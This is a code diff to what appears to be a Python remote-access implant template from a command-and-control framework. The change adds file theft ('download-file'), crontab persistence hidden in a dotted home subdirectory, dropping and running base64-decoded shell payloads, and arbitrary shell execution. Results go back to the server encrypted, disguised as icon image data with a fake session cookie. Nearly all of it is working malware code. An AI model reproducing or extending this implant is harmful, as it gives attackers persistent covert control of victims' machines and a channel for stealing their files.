@@ -40,19 +40,46 @@ icoimage = [%s]
 urls = [%s]
 killdate = "%s"
 useragent = ""
+imbase = "%s"
+
+def dfile(fname):
+  if fname:
+    with open(fname, "rb") as image_file:
+      imgbytes = image_file.read()
+  return "0000100001" + imgbytes
 
 def sai(delfile=False):
   import uuid
   filename = "/tmp/%%s.sh" %% (uuid.uuid4().hex)
-  imbase = "%s"
   imfull = base64.b64decode(imbase)
   output_file = open(filename, 'w')
   output_file.write(imfull)
   output_file.close()
   import subprocess
+  returnval = "Ran Start Another Implant - File dropped: %%s" %% filename
   p = subprocess.Popen(["sh", filename])
   if delfile:
     p = subprocess.Popen(["rm", filename])
+    returnval = "Ran Start Another Implant - File removed: %%s" %% filename
+  return returnval
+
+def persist():
+  import uuid, os
+  dircontent = "%%s/.%%s" %% (os.environ['HOME'], uuid.uuid4().hex)
+  os.mkdir(dircontent)
+  filename = "%%s/%%s_psh.sh" %% (dircontent, uuid.uuid4().hex)
+  imfull = base64.b64decode(imbase)
+  output_file = open(filename, 'w')
+  output_file.write(imfull)
+  output_file.close()
+  import subprocess as s
+  s.call("crontab -l | { cat; echo '* 10 * * * sh %%s'; } | crontab -" %% filename, shell=True)
+  return "Installing persistence via user crontab everyday at 10am: %%s" %% filename
+
+def remove_persist():
+  import subprocess as s
+  s.call("crontab -l | { cat;  } | grep -v '_psh.sh'| crontab -", shell=True)
+  return "Removed persistence via user crontab" 
 
 def decrypt_bytes_gzip( key, data):
   iv = data[0:16]
@@ -86,36 +113,40 @@ while(True):
     try:
       returncmd = decrypt( key, html )
       returncmd = returncmd.rstrip('\\0')
+
       if "multicmd" in returncmd:
+
         returncmd = returncmd.replace("multicmd","")
+        returnval = ""
         split = returncmd.split("!d-3dion@LD!-d")
+
         for cmd in split:
-          #print cmd
           if "$sleeptime" in cmd:
             timer = int(cmd.replace("$sleeptime = ",""))
+          elif "download-file" in cmd:  
+            fname = cmd.replace("download-file ","")
+            returnval = dfile(fname) 
+          elif "install-persistence" in cmd:  
+            returnval = persist() 
+          elif "remove-persistence" in cmd:  
+            returnval = remove_persist() 
           elif cmd == "startanotherimplant":   
-            sai(delfile=True)
+            returnval = sai(delfile=True)
           elif "startanotherimplant-keepfile" in cmd:   
-            sai()  
+            returnval = sai()  
           else:
             returnval = subprocess.check_output(cmd, shell=True)
-            #print returnval
-            server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
-            opener = urllib2.build_opener()
-            postcookie = encrypt(key, cmd)
-            data = base64.b64decode(random.choice(icoimage))
-            dataimage = data.ljust( 1500, '\\0' )
-            dataimagebytes = dataimage+(encrypt(key, returnval, gzip=True))
 
-            if hh: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh,'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
-            else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
-            res=urllib2.urlopen(req);
-            response = res.read()
-
-            #opener.addheaders.append(('Cookie', "SessionID=%%s" %% postcookie))
-            #urllib2.install_opener(opener)
-            #req = urllib2.Request(server, dataimagebytes)
-            #response = urllib2.urlopen(req)
+          server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
+          opener = urllib2.build_opener()
+          postcookie = encrypt(key, cmd)
+          data = base64.b64decode(random.choice(icoimage))
+          dataimage = data.ljust( 1500, '\\0' )
+          dataimagebytes = dataimage+(encrypt(key, returnval, gzip=True))
+          if hh: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh,'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
+          else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
+          res=urllib2.urlopen(req);
+          response = res.read()
 
     except Exception as e:
       E = e
